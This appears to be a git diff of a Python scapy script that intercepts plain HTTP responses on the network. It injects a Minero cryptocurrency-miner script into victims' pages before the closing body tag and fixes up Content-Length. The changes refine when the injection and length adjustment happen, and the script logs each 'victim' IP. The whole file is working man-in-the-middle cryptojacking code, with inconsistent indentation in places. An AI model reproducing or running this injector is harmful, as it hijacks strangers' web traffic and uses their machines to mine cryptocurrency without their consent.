@@ -60,6 +60,8 @@ def change_payload(packet, load):
 
 def inject_code(packet):
 	try:
+		onlyContentLengthAdjustment=False
+		injected=False
 		http_packet = scapy.IP(packet.get_payload())
 
 		if http_packet.haslayer(scapy.Raw):
@@ -74,6 +76,9 @@ def inject_code(packet):
             			load = load.replace("HTTP/1.1", "HTTP/1.0")
 
         		if http_packet[scapy.TCP].sport == 80:
+#				layer = http_packet[scapy.load_layer("http")]
+
+#				print(layer)
 
 				injectionCode = ""
 
@@ -86,32 +91,38 @@ def inject_code(packet):
 					injectionCode = injectionCode+"<script>var miner = new Minero.Anonymous(\'" + str(config["siteKey"]) +  "\');miner.start();</script>";
 
 #				print(load)
+				length_search=False
 
-				load = load.replace("</body>", injectionCode + "</body>")
-				load = load.replace("</BODY>", injectionCode + "</BODY>")
+				if "</body>" in load or "</BODY>" in load:
+					load = load.replace("</body>", injectionCode + "</body>")
+					load = load.replace("</BODY>", injectionCode + "</BODY>")
+					length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+					injected=True
+				elif re.search("(?:Content-Length:\s)(\d*)", load):
+					length_search=re.search("(?:Content-Length:\s)(\d*)", load)
+					injected=True
+					onlyContentLengthAdjustment=True
 
-#				print(load)
+	      				if length_search and "text/html" in load:
+      		        			length = length_search.group(1)
+			 			new_length = int(length) + len(injectionCode)
+        					load = load.replace(length, str(new_length))
 
-				length_search = re.search("(?:Content-Length:\s)(\d*)", load)
-
-            			if length_search and "text/html" in load:
-                			length = length_search.group(1)
-               	 			new_length = int(length) + len(injectionCode)
-                			load = load.replace(length, str(new_length))
 
 			ipConstraint = str(config["ipConstraint"])
 			ipConstraintActive = ipConstraint != ""
 
-	        	if (ipConstraint in http_packet.dst and ipConstraintActive) or (not ipConstraintActive and load != http_packet[scapy.Raw].load):
+	        	if injected and (ipConstraint in http_packet.dst and ipConstraintActive) or (not ipConstraintActive and load != http_packet[scapy.Raw].load):
 				dateTime = datetime.now()
-		   		print('injection new packet into victim at ' + http_packet.dst + " at " + dateTime.strftime("%Y-%m-%d %H:%M:%S"))
+				if not onlyContentLengthAdjustment:
+		   			print('injection new packet into victim at ' + http_packet.dst + " at " + dateTime.strftime("%Y-%m-%d %H:%M:%S"))
             			new_packet = change_payload(http_packet, load)
             			packet.set_payload(str(new_packet))
 
 		packet.accept()
 
 	except Exception as error:
-#		print error
+		print error
 		packet.accept()
 
 print 'Listening for HTTP traffic...'
